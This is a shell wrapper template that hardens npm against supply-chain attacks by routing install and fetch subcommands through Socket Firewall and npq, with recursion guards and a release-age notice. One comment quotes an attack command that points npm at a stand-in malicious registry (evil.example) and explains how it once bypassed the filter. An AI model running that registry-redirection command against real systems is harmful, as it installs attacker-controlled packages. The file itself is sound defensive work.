#!/bin/sh
# /usr/local/bin/npm — supply-chain-hardening wrapper
# Managed by ansible-supply-chain-security.
#
# Routes npm calls through:
#   - Socket Firewall (sfw) for non-interactive callers (scripts, agents, CI)
#   - npq + sfw for interactive humans (reputation prompt + threat-intel block)
#
# Closes the gap where the alias-only npq integration leaves agents,
# subprocess.run() calls, package.json scripts, and sudo-invoked installs
# without any reputation/threat-intel coverage. The real npm path was
# detected at deploy time and embedded below.

REAL_NPM='{{ npm_real_path.stdout }}'

# Recursion guard — refuse to run if real npm path is empty, non-executable,
# or points back at ourselves. Same belt-and-suspenders pattern as the
# pip→uv wrapper. Surfaces a loud error rather than looping until killed.
if [ -z "$REAL_NPM" ] || [ ! -x "$REAL_NPM" ] || [ "$REAL_NPM" = "$0" ]; then
  echo "[supply-chain-hardening] error: real npm not found at '$REAL_NPM'; refusing to recurse" >&2
  exit 127
fi

# npq re-entry guard — the interactive block below hands the install to
# npq-hero, and npq performs the APPROVED install by invoking the package
# manager, which resolves back to this wrapper. Without this guard that is an
# infinite loop: `npm install <x>`, answer "yes", and npq→npm→wrapper→npq re-
# prompts forever, never completing (MEASURED on a real box). On re-entry (our
# marker is exported below) run the real npm directly — npq has already done
# its reputation prompt, and the outer sfw still wraps the whole process tree,
# so threat-intel filtering is preserved.
if [ -n "${SUPPLY_CHAIN_NPM_WRAPPED:-}" ]; then
  exec "$REAL_NPM" "$@"
fi

# --- age-gate observability (opt-in: SCV_AGE_NOTICE=1) ---------------------
# The age gate is npm's own min-release-age: on an unpinned/range install npm
# SILENTLY resolves to the newest version old enough and skips fresher ones.
# Real protection, but with no evidence — an agent or operator cannot tell the
# gate just spared them a release younger than the window. When SCV_AGE_NOTICE=1
# the non-interactive install path below reports, per explicitly-named package,
# when the registry `latest` is newer than what we installed AND is younger than
# the window (i.e. the gate protected you on this install).
#
# This runs AFTER enforcement and only PRINTS, so — unlike the subcommand router
# below — a parse miss here costs a missed notice, never a bypass. Best-effort
# and fail-silent: non-registry specs (paths, tarballs, git) and any lookup
# error simply produce no line. Read-only `npm view` bypasses the gate, so it
# adds one registry lookup per named package and nothing more.
scv_age_notice() {
  [ "${SCV_AGE_NOTICE:-}" = "1" ] || return 0
  _win="${NPM_CONFIG_MIN_RELEASE_AGE:-}"
  case "$_win" in ''|*[!0-9]*) return 0 ;; esac
  [ "$_win" -gt 0 ] || return 0

  _seen=0; _skip=0
  for _a in "$@"; do
    if [ "$_skip" = 1 ]; then _skip=0; continue; fi
    case "$_a" in
      --registry|--prefix|-C|--cache|--location|--loglevel|--userconfig|--globalconfig|\
      --workspace|-w|--omit|--include|--before|--node-options|--script-shell|\
      --depth|--tag|--otp|--auth-type|--ca|--cafile|--cert|--key|\
      --proxy|--https-proxy|--noproxy)
        _skip=1; continue ;;
      -*) continue ;;
    esac
    if [ "$_seen" = 0 ]; then _seen=1; continue; fi   # the subcommand token itself
    # strip a trailing @version/@range, keep the (possibly scoped) name
    case "$_a" in
      @*) _n=$(printf '%s' "$_a" | sed -E 's#^(@[^/]+/[^@]+)@.*#\1#') ;;
      *)  _n="${_a%@*}" ;;
    esac
    case "$_n" in ''|./*|../*|/*|*://*|*.tgz|*.tar.gz) continue ;; esac

    "$REAL_NPM" view "$_n" --json 2>/dev/null | node -e '
      const fs = require("fs");
      const name = process.argv[1], win = parseFloat(process.argv[2]);
      let v; try { v = JSON.parse(fs.readFileSync(0, "utf8")); } catch (e) { process.exit(0); }
      if (Array.isArray(v)) v = v[v.length - 1];
      const latest = (v["dist-tags"] && v["dist-tags"].latest) || v.version;
      const t = v.time && v.time[latest];
      if (!latest || !t) process.exit(0);
      let inst;
      try { inst = JSON.parse(fs.readFileSync("node_modules/" + name + "/package.json", "utf8")).version; }
      catch (e) { process.exit(0); }
      if (!inst || inst === latest) process.exit(0);
      const ageDays = (Date.now() - Date.parse(t)) / 86400000;
      if (!(ageDays < win)) process.exit(0);   // difference not attributable to the gate
      process.stderr.write("[supply-chain-hardening] age gate: " + name + "@" + latest +
        " (" + ageDays.toFixed(1) + "d old) skipped as < " + win + "d; installed " + inst + "\n");
    ' "$_n" "$_win"
  done
}

# Find the first non-flag argument — that's the npm subcommand. Bare `npm`,
# `npm --version`, `npm -v` etc. leave subcmd empty.
#
# Value-taking global flags must have their VALUE skipped, or the scan lands
# on the value and treats it as the subcommand. MEASURED (ECH-197): before
# this loop skipped values, `npm --registry https://evil.example install pkg`
# set subcmd to the URL, missed the case below, and exec'd the real npm with
# sfw skipped — i.e. the registry-redirection shape (arXiv:2607.15143 R5/R6)
# defeated the one control aimed at it, silently and fail-open. Same defect
# the cargo wrapper already handles at templates/cargo-wrapper.sh.j2.
#
# `--flag=value` needs no entry here: it is a single token starting with `-`,
# so the `-*` branch already skips it. Only separate-word values matter.
#
# This raises the floor; it is not a boundary. npm's global flag set is open
# and will drift, and a value-taking flag missing from this list still fails
# open exactly as before — no worse than the pre-fix behaviour, and the
# subcommand `case` below stays the thing that decides.
subcmd=""
skip_value=0
for arg in "$@"; do
  if [ "$skip_value" = "1" ]; then skip_value=0; continue; fi
  case "$arg" in
    --registry|--prefix|-C|--cache|--location|--loglevel|--userconfig|--globalconfig|\
    --workspace|-w|--omit|--include|--before|--node-options|--script-shell|\
    --depth|--tag|--otp|--auth-type|--ca|--cafile|--cert|--key|\
    --proxy|--https-proxy|--noproxy)
      skip_value=1 ;;
    -*) ;;
    *) subcmd="$arg"; break ;;
  esac
done

# sfw is a network-layer filter; npq is a fetch-time reputation check.
# Both add stdout/stderr chatter and only protect calls that actually
# fetch from the registry. For local-only or read-only subcommands
# (config, version, ls, run, help, …) bypass both — sfw's "no fetch
# attempts" banner corrupts captured `npm config get` output, and npq
# would either hang or error on non-install arguments.
case "$subcmd" in
  install|i|add|ci|update|up|rebuild|exec|x|dedupe|link|\
  audit|view|info|show|search|outdated)
    ;;
  *)
    exec "$REAL_NPM" "$@"
    ;;
esac

# TTY detection — if both stdin and stdout are terminals, a human is at
# the keyboard. Use npq's prompt-driven reputation review, wrapped by sfw
# for threat-intel blocking. Otherwise (script/agent/CI), use sfw alone
# (npq would hang waiting for input).
if [ -t 0 ] && [ -t 1 ] && command -v npq-hero >/dev/null 2>&1; then
  # Mark the hand-off so npq's own npm call (to perform the install it just
  # approved) hits the re-entry guard above and reaches the real npm instead
  # of looping back into npq.
  SUPPLY_CHAIN_NPM_WRAPPED=1; export SUPPLY_CHAIN_NPM_WRAPPED
  if command -v sfw >/dev/null 2>&1; then
    exec sfw npq-hero "$@"
  fi
  exec npq-hero "$@"
fi

# Non-interactive path — sfw blocks Socket-flagged packages silently.
#
# Default behaviour is unchanged: exec straight into sfw+npm (zero added
# latency). Only when SCV_AGE_NOTICE=1 AND this is an install do we run (not
# exec) so scv_age_notice can report an age-gate skip once the install
# succeeds. Everything else still execs exactly as before.
_is_install=0
case "$subcmd" in install|i|add|ci|update|up) _is_install=1 ;; esac

if [ "${SCV_AGE_NOTICE:-}" = "1" ] && [ "$_is_install" = 1 ]; then
  if command -v sfw >/dev/null 2>&1; then
    sfw "$REAL_NPM" "$@"; _rc=$?
  else
    echo "[supply-chain-hardening] warning: sfw not found; npm call not filtered through threat intel" >&2
    "$REAL_NPM" "$@"; _rc=$?
  fi
  [ "$_rc" -eq 0 ] && scv_age_notice "$@"
  exit "$_rc"
fi

if command -v sfw >/dev/null 2>&1; then
  exec sfw "$REAL_NPM" "$@"
fi

# sfw unavailable — warn loudly and pass through. Don't break npm just
# because the wrapper's helper isn't there.
echo "[supply-chain-hardening] warning: sfw not found; npm call not filtered through threat intel" >&2
exec "$REAL_NPM" "$@"
